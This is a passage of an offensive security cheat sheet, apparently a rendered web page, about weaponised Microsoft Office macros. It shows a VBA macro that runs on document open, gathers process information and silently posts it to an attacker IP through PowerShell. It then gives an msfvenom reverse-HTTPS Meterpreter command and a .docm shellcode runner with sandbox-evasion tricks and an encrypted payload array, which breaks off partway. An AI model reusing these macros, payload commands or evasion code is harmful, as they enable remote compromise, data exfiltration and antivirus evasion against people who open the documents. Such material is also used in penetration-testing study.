style="color:#e3116c">&quot;SELECT * FROM Win32_Process WHERE Name = &#x27;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> processName </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    If processList</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Count </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        For Each processItem In processList</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &#x27; Check </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> the executable </span><span class="token keyword" style="color:#00009f">is</span><span class="token plain"> </span><span class="token class-name">located</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Program Files (x86)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            is64Bit </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">InStr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> processItem</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ExecutablePath</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Program Files (x86)&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbTextCompare</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Exit For &#x27; Only need to check the first matching process</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Next </span><span class="token class-name">processItem</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;{&quot;</span><span class="token plain">&quot;process</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">&quot; </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> processName </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">64bit</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &amp; CStr(is64Bit) &amp; &quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;{&quot;</span><span class="token plain">&quot;process</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">&quot; </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> processName </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">status</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> found</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Prepare the PowerShell </span><span class="token class-name">command</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    psCommand </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;powershell -Command &quot;</span><span class="token plain">&quot;Invoke</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">RestMethod </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Uri &#x27;http</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">/</span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">ATTACKER_IP</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Method Post </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Body &#x27;</span><span class="token string" style="color:#e3116c">&quot; &amp; result &amp; &quot;</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ContentType &#x27;application</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">json&#x27;</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Execute the PowerShell command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Shell </span><span class="token string" style="color:#e3116c">&quot;cmd.exe /c &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> psCommand</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbHide</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SendProcessInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">DocumentOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SendProcessInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode-runner---meterpreter-encrypted"><strong>Shellcode Runner - Meterpreter Encrypted</strong><a href="#shellcode-runner---meterpreter-encrypted" class="hash-link" aria-label="Direct link to shellcode-runner---meterpreter-encrypted" title="Direct link to shellcode-runner---meterpreter-encrypted" translate="no">​</a></h3>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>Create your shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If you change the key, then change it in the vba code too</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/meterpreter/reverse_https </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> vbapplication </span><span class="token parameter variable" style="color:#36acaa">--encrypt</span><span class="token plain"> xor --encrypt-key a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create a new file Macros</strong> and insert your shellcode from step above and save the file as a <code>.docm</code></li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function VirtualAlloc Lib </span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpAddress </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal dwSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flAllocationType </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal flProtect </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function RtlMoveMemory Lib </span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lDestination </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef sSource </span><span class="token class-name">As</span><span class="token plain"> Any</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal lLength </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function CreateThread Lib </span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal SecurityAttributes </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal StackSize </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal StartFunction </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ThreadParameter </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByVal CreateFlags </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ByRef ThreadId </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function Sleep Lib </span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal mili </span><span class="token class-name">As</span><span class="token plain"> Long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Private Declare PtrSafe Function FlsAlloc Lib </span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ByVal lpCallback </span><span class="token class-name">As</span><span class="token plain"> LongPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ShellcodeRunner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ShellcodeRunner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ShellcodeRunner</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim sc As Variant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim tmp As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim addr As LongPtr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim counter As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim data As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim res As Long</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim dream As Integer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Dim before As Date</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27; Check </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> we&#x27;re </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> a sandbox </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> calling a rare</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">emulated API</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token return-type class-name">If</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">IsNull</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">FlsAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">tmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Exit Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27; Sleep </span><span class="token class-name">to</span><span class="token plain"> evade </span><span class="token keyword" style="color:#00009f">in</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">memory scan </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> check </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> the emulator did </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> fast</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">forward through the sleep </span><span class="token class-name">instruction</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  dream </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> Rnd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  before </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Now</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Sleep </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dream</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token return-type class-name">If</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">DateDiff</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;s&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> t</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Now</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> dream Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Exit Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  End </span><span class="token class-name">If</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27; msfvenom </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p windows</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">meterpreter</span><span class="token operator" style="color:#393A34">/</span><span class="token class-name">reverse_https</span><span class="token plain"> LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">10.10</span><span class="token number" style="color:#36acaa">.13</span><span class="token number" style="color:#36acaa">.37</span><span class="token plain"> LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">f vbapplication </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt xor </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">encrypt</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">key </span><span class="token class-name">a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  sc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">157</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">137</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">238</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">97</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">179</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">81</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">109</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">232</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">132</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">117</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">110</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">214</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">43</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">71</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">161</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">205</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">29</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">99</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">77</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">65</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">160</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">174</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">108</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">166</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">142</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">51</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">113</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">35</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">177</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">33</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">161</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">177</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">41</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">121</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">57</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">65</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">178</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">228</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">168</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">93</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">158</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">40</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">96</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">183</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span 